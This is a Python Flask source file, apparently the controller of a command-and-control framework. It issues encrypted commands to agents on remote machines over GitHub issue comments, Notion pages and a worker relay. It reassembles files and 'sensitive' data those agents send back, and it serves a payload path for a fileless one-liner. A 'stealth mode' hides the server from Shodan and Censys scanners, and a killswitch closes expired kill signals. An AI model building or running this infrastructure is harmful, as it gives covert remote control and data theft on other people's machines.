        _logger.warning(f"killswitch sweep worker: {type(e).__name__}: {e}")
    if not gh_token:
        _notion_kill_sweep(cutoff)
        return
    for repo in repos:
        try:
            gh = GitHubClient(gh_token, repo)
            for iss in gh.list_open_kill_signals():
                ca = iss.get("created_at", "")
                try:
                    ts = datetime.fromisoformat(ca.replace("Z", "+00:00")).timestamp()
                except ValueError:
                    continue
                if ts and ts < cutoff and gh.close_issue(iss["number"]):
                    _logger.warning(f"killswitch sweep: closed expired KILLALL #{iss['number']} in {repo}")
        except Exception as e:
            _logger.warning(f"killswitch sweep github {repo}: {type(e).__name__}: {e}")
    _notion_kill_sweep(cutoff)


def _notion_kill_pages():
    with _lock:
        n_token = _state.get("notion_token", "")
    if not n_token:
        return n_token, []
    pages = [a for a in _all_known_agents()
             if a.get("channel") == "notion" and a.get("id")]
    return n_token, pages


def _notion_kill_cancel() -> int:
    """对 Notion 页写 CANCEL，盖过 KILLALL（评论删不掉）。"""
    n_token, pages = _notion_kill_pages()
    if not n_token:
        return 0
    n = 0
    for a in pages:
        try:
            ok, _err = NotionClient(n_token, a.get("repo") or "").post_comment(
                a["id"], "<!-- k -->CANCEL")
            if ok:
                n += 1
        except Exception as e:
            debug_log(f"notion kill cancel {a.get('id')}: {e}")
    if n:
        db.cfg_set(_conn(), "killswitch_notion_at", "")
    return n


def _notion_kill_sweep(cutoff: float):
    raised = (db.cfg_get(_conn(), "killswitch_notion_at") or "").strip()
    if not raised:
        return
    try:
        ts = float(raised)
    except ValueError:
        return
    if ts and ts < cutoff:
        n = _notion_kill_cancel()
        if n:
            _logger.warning(f"killswitch sweep: notion CANCEL posted on {n} page(s)")


def _autoclean_channels():
    """Trim relay-side history periodically — the local DB keeps everything.

    GitHub: delete oldest comments per agent issue beyond `issue_limit`
    (same logic as the manual /api/issues/cleanup button). Worker: the
    worker-side hourly cron already trims D1 (keep-newest policy); notion
    pages are small and left alone.
    """
    with _lock:
        token = _pick_token()
        limit = _state["issue_limit"]
        stale = _state["stale_days"]
        repos = list({a["repo"] for a in _state["agents"]
                      if a.get("channel") == "github"}
                     or set(_github_repos_effective()))
    if not token or limit == 0 or not repos:
        return
    total = 0
    for repo in repos:
        try:
            gh = GitHubClient(token, repo)
            deleted, _scanned, _details = gh.auto_cleanup(limit, stale)
            total += deleted
        except Exception as e:
            debug_log(f"autoclean {repo}: {e}")
    if total:
        _audit("autoclean", detail=f"github comments deleted={total} keep={limit}/agent")
        debug_log(f"autoclean: deleted {total} comment(s), keeping newest {limit} per agent")


def _bg_poll():
    poll_count = 0
    interval = 30          # 预赋值：try 内异常时外层 sleep 不至于 NameError 杀死线程
    last_discovery = 0.0
    last_autoclean = 0.0
    last_killsweep = 0.0
    while True:
        try:
            # ── Channel auto-cleanup (runs even when the UI is idle) ─────────
            # Everything is already stored locally; relay channels only need
            # enough history for live agents' watermarks. Default every 2h.
            _autoclean_every = max(600, int(os.environ.get("C2_AUTOCLEAN_SECS", "7200")))
            if time.time() - last_autoclean > _autoclean_every:
                last_autoclean = time.time()
                _autoclean_channels()

            # Kill TTL 在 idle 时也必须跑。否则浏览器关掉后过期 KILLALL
            # 一直开着，第二天新上线的 agent 会被秒杀（Bug#7 回潮）。
            if time.time() - last_killsweep > 300:
                last_killsweep = time.time()
                try:
                    _killswitch_sweep()
                except Exception as e:
                    debug_log(f"killswitch sweep idle: {e}")

            # ── Idle check: skip GitHub API when no browser is active ─────────
            idle = (time.time() - _last_active) > _IDLE_AFTER
            with _sse_lock:
                has_sse = bool(_sse_queues)
            if idle and not has_sse:
                time.sleep(15)   # 无浏览器且无 SSE：不烧 GitHub 限额
                continue

            with _lock:
                gh_token = _pick_token()   # random GitHub token from pool
                password = _state["password"]
                repos    = _github_repos_effective()
                agents   = list(_state["agents"])
                interval = _state["poll_interval"]
                limit    = _state["issue_limit"]
                stale    = _state["stale_days"]
                times    = dict(_state["last_times"])
                n_token  = _state.get("notion_token", "")
                n_dbs    = list(_state.get("notion_databases", []))
                w_urls   = _state.get("worker_urls", "")
                w_secret = _state.get("worker_secret", "")
                w_path   = _state.get("worker_path", "")

            # If in-memory list is empty, reload from DB (e.g. after crash/restart
            # before first manual refresh, or if state was cleared accidentally).
            if not agents:
                agents = db.agent_list(_conn())
                if agents:
                    with _lock:
                        _state["agents"] = agents

            # Periodic discovery (every ~30 s while active): pick up brand-new
            # agents without a manual refresh. One list-issues call per repo.
            if (gh_token or n_token or (w_urls and w_secret)) and (time.time() - last_discovery > 30):
                last_discovery = time.time()
                if _discover_agents(_conn()):
                    conn = _conn()
                    raw = db.agent_list(conn)
                    with _lock:
                        _state["agents"] = raw
                    agents = raw
                    _emit("agents_updated", {"agents": _agents_for_ui(conn)})

            has_github = bool(gh_token and password)
            has_notion = bool(n_token and password)
            has_worker = bool(w_urls and w_secret and password)
            if not (has_github or has_notion or has_worker) or not agents:
                time.sleep(2)
                continue

            def _poll_one(agent):
                aid     = agent["id"]
                repo    = agent["repo"]
                channel = agent.get("channel", "github")
                try:
                    if channel == "notion":
                        client = NotionClient(n_token, repo)
                    elif channel == "worker":
                        client = WorkerClient(w_secret, w_urls, w_path)
                    else:
                        client = GitHubClient(gh_token, repo)
                    since    = times.get(aid)
                    comments = client.get_comments(aid, since)
                    # Worker D1 重建后 AUTOINCREMENT 从头计数：控制器 last_times
                    # 仍是高位数字水位时，空拉取≠报错，回显永远进不来。
                    # 连续空轮后 since=0 探一次；max(id) < since 即复位。
                    if (
                        not comments
                        and channel == "worker"
                        and _worker_d1_probe_due(aid, _worker_since_high(since))
                    ):
                        probe = client.get_comments(aid, 0)
                        if _d1_sequence_reset(since, probe):
                            comments = probe
                            with _lock:
                                _state["last_times"][aid] = "0"
                            db.cursor_set(_conn(), aid, "0")
                    elif comments or channel != "worker":
                        _worker_d1_probe_due(aid, False)
                    if comments:
                        _process_comments(agent, comments, password)
                except Exception as e:
                    _logger.warning(f"_poll_one: agent={aid} repo={repo} "
                                    f"channel={channel} error={type(e).__name__}: {e}")

            if agents:
                max_workers = min(len(agents), 8)
                with ThreadPoolExecutor(max_workers=max_workers, thread_name_prefix="poll") as ex:
                    futs = [ex.submit(_poll_one, ag) for ag in agents]
                    for f in as_completed(futs):
                        try:
                            f.result()
                        except Exception as e:
                            debug_log(f"_bg_poll: future error: {type(e).__name__}: {e}")

            poll_count += 1
            if poll_count % 10 == 0:
                _sendit_cleanup()
                _killswitch_sweep()
            # Auto-cleanup: GitHub only (Notion doesn't support comment deletion)
            if limit > 0 and poll_count % 10 == 0 and has_github:
                seen = set(a["repo"] for a in agents
                           if a.get("channel") == "github" and a.get("repo")) or set(repos)
                for repo in seen:
                    try:
                        gh = GitHubClient(gh_token, repo)
                        deleted, scanned, details = gh.auto_cleanup(limit, stale)
                        if deleted > 0:
                            _emit("notification", {
                                "type": "cleanup",
                                "message": f"Auto-cleanup: {deleted} old comment(s) deleted in {repo} (kept newest {limit} per agent)",
                            })
                    except Exception as e:
                        debug_log(f"_bg_poll: auto_cleanup error repo={repo}: {type(e).__name__}: {e}")

        except Exception as e:
            debug_log(f"_bg_poll: outer loop error: {type(e).__name__}: {e}")

        time.sleep(max(interval, 5))


def _worker_since_high(since) -> bool:
    try:
        return int(since or 0) > 0
    except (TypeError, ValueError):
        return False


def _d1_sequence_reset(since, probe_comments) -> bool:
    """True when D1 AUTOINCREMENT restarted (probe max id < stored numeric since)."""
    try:
        since_n = int(since or 0)
    except (TypeError, ValueError):
        return False
    if since_n <= 0 or not probe_comments:
        return False
    ids = []
    for c in probe_comments:
        try:
            n = int(c.get("id") or 0)
        except (TypeError, ValueError):
            continue
        if n > 0:
            ids.append(n)
    return bool(ids) and max(ids) < since_n


_WORKER_EMPTY_STREAK = {}


def _worker_d1_probe_due(aid: str, empty_and_high: bool) -> bool:
    """Throttle since=0 probes: 12th consecutive empty, then every 60."""
    with _lock:
        if not empty_and_high:
            _WORKER_EMPTY_STREAK.pop(aid, None)
            return False
        n = _WORKER_EMPTY_STREAK.get(aid, 0) + 1
        _WORKER_EMPTY_STREAK[aid] = n
    return n == 12 or (n > 12 and n % 60 == 0)


def _process_comments(agent: dict, comments: list, password: str):
    aid     = agent["id"]
    conn    = _conn()
    last_ts = None
    saw_new_response = False   # P0-2: only actual new <!-- r --> responses count as agent activity
    watermark_hold = False     # 解密/落库失败挡住水位，避免后一条成功把前一条跳过

    for c in comments:
        cid  = c["id"]
        body = c.get("body") or ""

        if db.comment_is_processed(conn, aid, cid):
            # P0-2: already-processed comments only advance the watermark —
            # they do NOT refresh last_reply. Otherwise the GitHub `since=`
            # semantics (which includes the boundary comment) would keep the
            # agent permanently "online".
            if not watermark_hold:
                last_ts = c.get("updated_at") or c.get("created_at") or last_ts
            continue

        # last_seen 只跟 Agent 回显走。控制器自己贴的 <!-- c --> 不刷，
        # 否则 last_reply 为空时 tie-break 会把后续发令锁在刚投过的备通道。
        is_cmd_echo = body.startswith("<!-- c -->")
        ts = c.get("updated_at") or c.get("created_at") or ""
        if ts and not is_cmd_echo:
            try:
                conn.execute(
                    "UPDATE agents SET last_seen=? WHERE id=? AND repo=? AND channel=?",
                    (ts, aid, agent.get("repo", ""), agent.get("channel", "github")),
                )
                conn.commit()
            except Exception as e:
                debug_log(f"_process_comments: last_seen update failed aid={aid}: {e}")

        # ── Command echo (<!-- c -->) ─────────────────────────────────────────
        if is_cmd_echo:
            enc = body[10:]
            dec = crypto.decrypt(enc, password)
            if dec is None:
                # 与 <!-- r --> 一致：密码错时不 mark，修好 Secret 后还能重试。
                debug_log(f"_process_comments: command-echo decrypt failed aid={aid} cid={cid}")
                watermark_hold = True
                continue
            try:
                env      = json.loads(dec)
                cmd_id   = env.get("command_id", "")
                cmd_text = env.get("command",    dec)
            except Exception as e:
                debug_log(f"_process_comments: JSON parse warn cid={cid}: {e}")
                cmd_id, cmd_text = "", dec

            if cmd_id:
                with _lock:
                    hist = _state["cmd_history"].setdefault(aid, {})
                    hist[cmd_id] = cmd_text
                    # bound memory on long-running controllers
                    if len(hist) > 500:
                        for k in list(hist.keys())[:len(hist) - 500]:
                            del hist[k]
                db.cmd_save(conn, cmd_id, aid, cmd_text)

                # Save to messages table so Terminal history shows it —
                # even if the command was sent from a different controller (e.g. Rust GUI).
                # Skip if already saved by _internal_send (same cmd_id, same agent).
                if not _is_file_cmd(cmd_text):
                    exists = conn.execute(
                        "SELECT 1 FROM messages WHERE command_id=? AND is_command=1",
                        (cmd_id,)
                    ).fetchone()
                    if not exists:
                        db.msg_save(conn, aid, cmd_text, True, cmd_id, None, "command")

            db.comment_mark(conn, aid, cid)
            if not watermark_hold:
                last_ts = c.get("updated_at") or c.get("created_at") or last_ts
            continue

        # ── Response (<!-- r -->) ─────────────────────────────────────────────
        if body.startswith("<!-- r -->"):
            raw = body[10:]
        elif not body.startswith("<!--"):
            # Not a recognized C2-prefixed comment (e.g. GitHub web UI comment) — skip decrypt
            db.comment_mark(conn, aid, cid)
            if not watermark_hold:
                last_ts = c.get("updated_at") or c.get("created_at") or last_ts
            continue
        else:
            raw = body
        dec = crypto.decrypt(raw, password)
        if dec is None:
            # 密码错配黑障修复：不再单次失败即丢弃。与 agent 侧对齐——连续 5 次
            # 解密失败才跳过该评论并推进水位线，期间留待重试；达到阈值时大声告警。
            with _lock:
                fails = _state.setdefault("decrypt_fails", {}).get(aid, 0) + 1
                _state["decrypt_fails"][aid] = fails
            if fails == 1 or fails >= 5:
                _emit("notification", {
                    "type": "decrypt_mismatch",
                    "agent_id": aid,
                    "fails": fails,
                    "message": (
                        f"通道解密失败 agent={aid}（第 {fails} 次）。"
                        "请核对 Settings「控制器解密密码」与 Builder 编包密码是否一致。"
                    ),
                })
            # 永不 mark、不推进水位：改对密码后这些回包还能捞回来。
            # 只告警，避免第 5 次把评论从信道里「处理掉」。
            watermark_hold = True
            continue

        with _lock:
            _state.setdefault("decrypt_fails", {}).pop(aid, None)   # 解密成功，清零
        try:
            env      = json.loads(dec)
            content  = env.get("content",      dec)
            resp_to  = env.get("response_to",  None)
            msg_type = env.get("message_type", None)
        except Exception:
            content, resp_to, msg_type = dec, None, None

        # Chunked response
        if content.startswith("[Part "):
            chunk_st = _handle_chunk(aid, content, resp_to, msg_type)
            if not chunk_st:
                watermark_hold = True
                continue          # persist 失败：不 mark，下一轮重试
            db.comment_mark(conn, aid, cid)
            if not watermark_hold:
                last_ts = c.get("updated_at") or c.get("created_at") or last_ts
            if chunk_st == "done":
                saw_new_response = True
            continue

        _dispatch_response(aid, content, resp_to, msg_type, agent)
        db.comment_mark(conn, aid, cid)
        if not watermark_hold:
            last_ts = c.get("updated_at") or c.get("created_at") or last_ts
        saw_new_response = True

    if last_ts:
        if agent.get("channel") == "worker" and not watermark_hold:
            ids = [c.get("id") for c in comments if str(c.get("id", "")).isdigit()]
            last_ts = str(max(int(i) for i in ids)) if ids else last_ts
        with _lock:
            _state["last_times"][aid] = last_ts
        db.cursor_set(conn, aid, last_ts)
        # P0-2: only update last_reply when we processed a NEW response —
        # not on every poll cycle that returns old comments.
        if saw_new_response:
            _agent_last_reply[aid] = time.time()


# Agent 分片约 45KB；50MB 文件约 1200 片。再大就当损坏/伪造，避免
# set(range(1, 999999999)) 把控制器打挂。
_MAX_CHUNK_PARTS = 4096


def _cmd_verb(cmd: str) -> str:
    t = (cmd or "").strip()
    if not t:
        return "?"
    return t.split(None, 1)[0][:40]


def _handle_chunk(aid, content, resp_to, msg_type):
    try:
        header, chunk_data = content.split("\n", 1)
        inner = header[6:-1]
        resp_id, idx_s, tot_s = inner.split("/")
        idx, total = int(idx_s), int(tot_s)
        if total < 1 or total > _MAX_CHUNK_PARTS or idx < 1 or idx > total:
            raise ValueError(f"chunk bounds idx={idx} total={total}")
    except Exception as e:
        debug_log(f"_handle_chunk: parse failed aid={aid}: {e}")
        return False

    assembled = None
    saved_resp_to = resp_to
    saved_type    = msg_type
    stale_rids = []
    now = time.time()

    with _lock:
        buf   = _state["chunk_buf"].setdefault(aid, {})
        # C5 TTL：30 分钟未凑齐的分片序列直接丢弃（缺片的重组永远不会完成，
        # 旧实现里这类 entry 永驻内存）。
        for rid in [r for r, e in buf.items()
                    if now - e.get("_ts", now) > 1800]:
            debug_log(f"_handle_chunk: drop stale chunk group {rid} (TTL 30m)")
            stale_rids.append(rid)
            del buf[rid]
        entry = buf.setdefault(resp_id, {
            "total":   total,
            "parts":   {},
            "resp_to": resp_to,
            "type":    msg_type,
            "_ts":     now,
        })
        entry["_ts"] = now
        entry["parts"][idx] = chunk_data
        saved_resp_to = entry["resp_to"]
        saved_type    = entry["type"]

        parts = entry["parts"]
        if len(parts) == total and all(i in parts for i in range(1, total + 1)):
            assembled = "".join(parts[i] for i in range(1, total + 1))
            del buf[resp_id]

    try:
        db.chunk_put(_conn(), aid, resp_id, idx, total,
                     saved_resp_to, saved_type, chunk_data, now)
    except Exception as e:
        debug_log(f"_handle_chunk: persist failed aid={aid}: {e}")
        return False
    for rid in stale_rids:
        try:
            db.chunk_delete_group(_conn(), aid, rid)
        except Exception:
            pass

    if assembled is not None:
        try:
            db.chunk_delete_group(_conn(), aid, resp_id)
        except Exception:
            pass
        agent = _agent_row(aid) or {"id": aid, "hostname": "unknown"}
        _dispatch_response(aid, assembled, saved_resp_to, saved_type, agent)
        return "done"
    return "pending"


def _hydrate_chunk_buf():
    try:
        rows = db.chunk_load_all(_conn())
    except Exception as e:
        debug_log(f"chunk hydrate failed: {e}")
        return
    with _lock:
        buf = _state["chunk_buf"]
        for rec in rows:
            aid = rec["agent_id"]
            rid = rec["resp_id"]
            agent_buf = buf.setdefault(aid, {})
            total = rec["total"]
            if not total or total < 1 or total > _MAX_CHUNK_PARTS:
                continue
            entry = agent_buf.setdefault(rid, {
                "total": total,
                "parts": {},
                "resp_to": rec["resp_to"],
                "type": rec["msg_type"],
                "_ts": rec["ts"] or 0,
            })
            entry["parts"][rec["idx"]] = rec["part"]
            entry["_ts"] = max(entry.get("_ts") or 0, rec["ts"] or 0)


def _bg_sendit_download(url: str, filename: str, agent: dict):
    """Background: download from sendit.sh URL → save to agent library folder.
    Reuses the existing file_downloaded SSE event (no new SSE needed).
    """
    filename = _safe_fname(filename)   # defense in depth: never escape dl_dir
    def _do():
        try:
            MAX_DOWNLOAD = 200 * 1024 * 1024  # 200 MB hard limit

            # SSRF 防护：手动跟随重定向，每一跳都校验 host（拒绝私网/环回/
            # 链路本地），不交给 requests 自动跟随。
            from worker_api import validate_external_url
            cur, hops = url, 0
            while True:
                validate_external_url(cur)      # raises on private/blocked host
                r = _requests.get(cur, timeout=30, stream=True, allow_redirects=False)
                if r.status_code in (301, 302, 303, 307, 308) and hops < 4:
                    nxt = r.headers.get("Location", "")
                    if not nxt:
                        r.raise_for_status(); break
                    from urllib.parse import urljoin
                    cur = urljoin(cur, nxt)
                    hops += 1
                    continue
                r.raise_for_status()
                break

            # Check Content-Length before reading body（非数字头按未知处理）
            cl = r.headers.get("Content-Length")
            try:
                cl_n = int(cl) if cl else None
            except (TypeError, ValueError):
                cl_n = None
            if cl_n and cl_n > MAX_DOWNLOAD:
                raise ValueError(f"File too large ({cl_n} bytes, max {MAX_DOWNLOAD})")

            dl_dir = _agent_download_dir(agent)
            fpath  = os.path.join(dl_dir, filename)

            # Handle name conflicts
            if os.path.exists(fpath):
                base, ext = os.path.splitext(filename)
                i = 1
                while os.path.exists(fpath):
                    fpath = os.path.join(dl_dir, f"{base}_{i}{ext}")
                    i += 1

            with open(fpath, "wb") as f:
                downloaded = 0
                for chunk in r.iter_content(chunk_size=65536):
                    downloaded += len(chunk)
                    if downloaded > MAX_DOWNLOAD:
                        raise ValueError(f"Download exceeded {MAX_DOWNLOAD} bytes limit")
                    f.write(chunk)

            stat = os.stat(fpath)
            _emit("file_downloaded", {
                "agent_id":  agent["id"],
                "filename":  os.path.basename(fpath),
                "size":      stat.st_size,
                "folder":    os.path.basename(dl_dir),
                "timestamp": datetime.now().strftime("%H:%M:%S"),
                "method":    "sendit",
            })

        except Exception as e:
            _emit("file_downloaded", {
                "agent_id":  agent.get("id", ""),
                "filename":  filename,
                "size":      0,
                "timestamp": datetime.now().strftime("%H:%M:%S"),
                "method":    "sendit",
                "error":     str(e),
            })

    threading.Thread(target=_do, daemon=True, name=f"sendit-dl-{filename}").start()


def _dispatch_response(aid, content, resp_to, msg_type, agent=None):
    conn = _conn()

    # ── sendit.sh upload response: parse URL and download in background ────────
    # Membership is memory-only (hydrated from DB on startup) so ordinary
    # replies do not pay a SQLite round-trip.
    if resp_to and resp_to in _sendit_pending:
        info = _sendit_claim(resp_to)
        if info:
            m = re.search(r'https://sendit\.sh/\w+/\S+', content)
            if m:
                url = m.group(0).rstrip('.,;)')   # strip trailing punctuation
                _bg_sendit_download(url, info["filename"], info["agent"])
            else:
                fn = info.get("filename") or "file"
                _emit("notification", {
                    "type": "sendit_nourl",
                    "agent_id": aid,
                    "filename": fn,
                    "message": f"sendit 回包没有下载地址，未取回 {fn}",
                })
            # Still fall through so the response appears in terminal

    # ── File list update ───────────────────────────────────────────────────────
    if content.startswith("[FILES_JSON]"):
        _handle_file_list(conn, aid, content, resp_to)
        return

    # ── File download (save to disk) ───────────────────────────────────────────
    if content.startswith("[FILE_UPLOAD_JSON]"):
        _handle_file_save(aid, content, agent)
        return

    if content.startswith("[FILE_PREVIEW_JSON]"):
        _emit("file_preview", {"agent_id": aid, "data": content[19:].strip()})
        return

    # ── Sysinfo / sensitive caching ────────────────────────────────────────────
    cmd_text = None
    if resp_to:
        cmd_text = db.cmd_get(conn, resp_to)
        if not cmd_text:
            with _lock:
                cmd_text = _state["cmd_history"].get(aid, {}).get(resp_to)

    if cmd_text:
        ct = cmd_text.strip()
        if ct == "sysinfo":
            db.si_save(conn, aid, content)
            _emit("sysinfo", {
                "agent_id":    aid,
                "content":     content,
                "collected_at": datetime.now().strftime("%H:%M:%S"),
            })
        elif ct == "sensitive":
            db.sen_save(conn, aid, content)
            _emit("sensitive", {
                "agent_id":    aid,
                "content":     content,
                "collected_at": datetime.now().strftime("%H:%M:%S"),
            })

    # Save plaintext to DB (skip raw file data)
    db.msg_save(conn, aid, content, False, None, resp_to, msg_type)

    # ── Push to browser (named "response" to avoid SSE default event collision) ─
    _emit("response", {
        "agent_id":    aid,
        "content":     content,
        "response_to": resp_to,
        "msg_type":    msg_type,
        "timestamp":   datetime.now().strftime("%H:%M:%S"),
        "sibling_ids": _sibling_ids_for(aid),
    })


def _handle_file_list(conn, aid, content, resp_to):
    payload = content[len("[FILES_JSON]\n"):]
    try:
        entries = json.loads(payload)
    except Exception:
        return

    # Determine the path from command history
    path = "/"
    if resp_to:
        cmd = db.cmd_get(conn, resp_to)
        if not cmd:
            with _lock:
                cmd = _state["cmd_history"].get(aid, {}).get(resp_to)
        if cmd:
            stripped = cmd.strip()
            if stripped in ("ls", "dir"):
                path = "/"
            elif stripped.startswith("ls "):
                path = stripped[3:].strip() or "/"
            elif stripped.startswith("dir "):
                path = stripped[4:].strip() or "/"

    db.fl_clear(conn, aid, path)
    for e in entries:
        db.fl_save(conn, aid, path, e["name"], e.get("is_dir", False), e.get("size", 0))

    _emit("file_list", {"agent_id": aid, "path": path, "entries": entries})


def _handle_file_save(aid, content, agent=None):
    """Parse [FILE_UPLOAD_JSON] and write file to downloads/<hostname>_<id>/."""
    try:
        json_str = content[len("[FILE_UPLOAD_JSON]\n"):]
        data     = json.loads(json_str)
        fname    = _safe_fname(data["name"])

        # 分块上传（大文件 / 目录 tar.gz）：agent 侧对 >40KB 载荷输出
        # [FILE_START]/[CHUNK_n]/[FILE_END] 格式；逐行重组 base64。
        # 直接 b64decode 整个串会因行内 '\n' 与标记行而失败 —— 修复既有 bug。
        raw_str = data["data"]
        if "[FILE_START]" in raw_str:
            buf = bytearray()
            for line in raw_str.splitlines():
                line = line.strip()
                if not line or line.startswith("[FILE_START]") or line.startswith("[CHUNK_") or line == "[FILE_END]":
                    continue
                buf += base64.b64decode(line)
            raw = bytes(buf)
        else:
            raw = base64.b64decode(raw_str)

        if agent is None:
            agent = _agent_row(aid) or {"id": aid, "hostname": "unknown"}

        dl_dir = _agent_download_dir(agent)
        fpath  = os.path.join(dl_dir, fname)

        # Avoid overwriting: append _1, _2 … suffix
        if os.path.exists(fpath):
            base, ext = os.path.splitext(fname)
            i = 1
            while os.path.exists(fpath):
                fpath = os.path.join(dl_dir, f"{base}_{i}{ext}")
                i += 1

        with open(fpath, "wb") as f:
            f.write(raw)

        final_name = os.path.basename(fpath)
        stat = os.stat(fpath)
        _emit("file_downloaded", {
            "agent_id":  aid,
            "filename":  final_name,
            "size":      stat.st_size,
            "folder":    os.path.basename(dl_dir),
            "timestamp": datetime.now().strftime("%H:%M:%S"),
        })

    except Exception as _e:
        _emit("file_downloaded", {
            "agent_id":  aid,
            "filename":  "unknown",
            "size":      0,
            "timestamp": datetime.now().strftime("%H:%M:%S"),
            "error":     str(_e),
        })


# ── Auth (stealth mode) ────────────────────────────────────────────────────────
#
# Anti-fingerprint contract (censys.io / shodan / page-hash scanners):
#   * ANY unauthenticated request — page, API, static asset, favicon, unknown
#     path — returns a byte-empty 200 with no HTML/JS/redirect body.
#   * Human login happens via URL parameters: http://host/?login=USER&pass=PASS
#     On success the session cookie is set and the browser is redirected to
#     the clean URL (credentials never persist in the address bar).
#   * POST /login (form) remains functional for first-party tooling
#     (tests / MCP server) but never renders HTML.
#   * login/pass query values are scrubbed from the werkzeug access log.

# Paths reachable WITHOUT a session. POST /login is the tooling entry;
# /payload/<token> is fetched by lab targets running the fileless one-liner.
_PUBLIC_PREFIXES = ("/payload/",)


def _blank():
    """Stealth response for unauthenticated probes.

    P2-11: HTML routes get 200+empty (indistinguishable from a dead server).
    API routes (/api/*, /stream) get 401+JSON so programmatic clients (MCP,
    curl, test scripts) can distinguish auth failure from empty success.
    """
    if request.path.startswith(("/api/", "/stream", "/payload/")):
        return jsonify({"error": "unauthorized"}), 401
    return Response(b"", status=200, mimetype="text/plain")


def _try_login(username: str, pwd: str) -> bool:
    ip = request.remote_addr or "0.0.0.0"
    allowed, remaining = _check_rate_limit(ip)
    if not allowed:
        return False
    with _lock:
        web_user = _state["web_username"]
        web_pwd  = _state["web_password"]
    if username == web_user and pwd == web_pwd:
        _clear_fails(ip)
        session.clear()          # prevent session fixation
        session["logged_in"] = True
        session["username"]  = username
        # Persistent cookie (default 30 days): without this the session cookie
        # is browser-session-scoped and every browser restart looked like
        # "refresh → blank page" under stealth mode.
        session.permanent = True
        _audit("login", detail=f"ip={ip}")
        return True
    _record_fail(ip)
    _audit("login_failed", detail=f"ip={ip} user={username[:32]}")
    return False


@app.before_request
def _stealth_gate():
    # 1. URL-parameter login on any path: ?login=USER&pass=PASS
    if not session.get("logged_in"):
        q_login = request.args.get("login", "")
        q_pass  = request.args.get("pass", "")
        if q_login or q_pass:
            if _try_login(q_login, q_pass):
                # Redirect to the same path WITHOUT the query — credentials
                # must not linger in the address bar / history.
                return redirect(request.path)
            return _blank()

    # 2. Unauthenticated everything else → blank (pages, /static/, favicon,
    #    API, SSE, unknown paths). POST /login reaches its own handler.
    if not session.get("logged_in"):
        if request.path.startswith(_PUBLIC_PREFIXES):
            return None
        if request.path == "/login" and request.method == "POST":
            return None
        return _blank()
    return None


def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("logged_in"):
            return _blank()
        return f(*args, **kwargs)
    return decorated


@app.before_request
def _update_activity():
    """Track last active time for any authenticated non-SSE request."""
    global _last_active
    if session.get("logged_in"):
        _last_active = time.time()


@app.route("/login", methods=["GET", "POST"])
def login():
    # GET is always blank — there is no login page to fingerprint.
    if request.method == "POST":
        if _try_login(request.form.get("username", "").strip(),
                      request.form.get("password", "")):
            return redirect(url_for("index"))
    return _blank()


@app.route("/logout")
def logout():
    session.clear()
    return _blank()


# ── Main page ─────────────────────────────────────────────────────────────────

@app.route("/")
@login_required
def index():
    return render_template("index.html")


# ── SSE ───────────────────────────────────────────────────────────────────────

@app.route("/stream")
@login_required
def stream():
    q = queue.Queue(maxsize=400)
    with _sse_lock:
        _sse_queues.append(q)

    def gen():
        # Send initial connected ping (no event name = default message event)
        global _last_active
        _last_active = time.time()
        yield "data: connected\n\n"
        try:
            while True:
                try:
                    yield q.get(timeout=20)
                except queue.Empty:
                    with _sse_lock:
                        still = q in _sse_queues
                    if not still:
                        # _emit 因队列满摘掉了本客户端：结束生成器，让 EventSource 重连
                        break
                    _last_active = time.time()
                    yield ": heartbeat\n\n"
        finally:
            with _sse_lock:
                if q in _sse_queues:
                    _sse_queues.remove(q)

    return Response(gen(), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


# ── Internal send helper (replaces broken test_request_context) ───────────────

def _channel_client(agent):
    """Build the relay client for one agent row. Returns (client, err)."""
    channel = agent.get("channel", "github")
    with _lock:
        gh_token = _pick_token()
        n_token  = _state.get("notion_token", "")
        w_urls   = _state.get("worker_urls", "")
        w_secret = _state.get("worker_secret", "")
        w_path   = _state.get("worker_path", "")
    if channel == "notion":
        if not n_token:
            return None, "Notion token not configured"
        return NotionClient(n_token, agent.get("repo") or ""), ""
    if channel == "worker":
        if not (w_urls and w_secret):
            return None, "Worker urls/secret not configured"
        try:
            return WorkerClient(w_secret, w_urls, w_path), ""
        except Exception as e:
            return None, f"Worker client: {e}"
    if not gh_token:
        return None, "GitHub token not configured"
    return GitHubClient(gh_token, agent.get("repo") or ""), ""


def _send_candidates(agent_id: str) -> list:
    """同一台机器的全部渠道行，最近活跃的排前面（发令优先打活动通道）。"""
    pool = _all_known_agents()
    hit = next((a for a in pool if str(a.get("id")) == str(agent_id)), None)
    if not hit:
        return []
    group = _sibling_agents(hit, pool)
    # 与侧栏同一套水位：内存优先，重启后用消息表补，避免令打到已不听的主频道。
    _annotate_last_reply(group, _conn())
    group.sort(key=_agent_recency_tuple, reverse=True)
    return group


def _internal_send(agent_id: str, cmd_text: str) -> tuple[bool, str]:
    """Send a command without going through HTTP request cycle.

    双通道：按最近活跃渠道先投。同一 command_id 写到所有 sibling——
    Agent 只听活动通道，但 API 200 不代表它在听；双写靠 command_id 去重。
    隧道 / WS Shell / 升级与普通命令走同一条路径。
    """
    with _lock:
        password = _state["password"]
    if not password:
        return False, "Password not configured"

    candidates = _send_candidates(agent_id)
    if not candidates:
        return False, "Agent not found"

    cmd_id  = f"cmd-{int(time.time()*1000)}-{uuid.uuid4().hex[:8]}"
    payload = json.dumps({"command_id": cmd_id, "command": cmd_text})
    enc     = crypto.encrypt(payload, password)
    if not enc:
        return False, "Encryption failed"

    last_err = "Agent not found"
    posted_id = None
    posted_ch = None
    for agent in candidates:
        client, cerr = _channel_client(agent)
        if not client:
            last_err = cerr
            continue
        target_id = str(agent.get("id") or "")
        channel = agent.get("channel", "github")
        ok_post, post_err = client.post_comment(target_id, f"<!-- c -->{enc}")
        if ok_post:
            if not posted_id:
                posted_id = target_id
                posted_ch = channel
            continue
        last_err = f"{channel.title()} API post failed: {post_err}"
        debug_log(f"_internal_send: {last_err} | try={target_id} repo={agent.get('repo')} cmd={_cmd_verb(cmd_text)}")

    if not posted_id:
        debug_log(f"_internal_send: all channels failed | asked={agent_id} cmd={_cmd_verb(cmd_text)}")
        return False, last_err

    conn = _conn()
    db.cmd_save(conn, cmd_id, posted_id, cmd_text)
    _audit("command", posted_id, cmd_text[:200])
    with _lock:
        for hid in {posted_id, str(agent_id)}:
            hist = _state["cmd_history"].setdefault(hid, {})
            hist[cmd_id] = cmd_text
            if len(hist) > 500:
                for k in list(hist.keys())[:len(hist) - 500]:
                    del hist[k]

    is_file = _is_file_cmd(cmd_text)
    if not is_file:
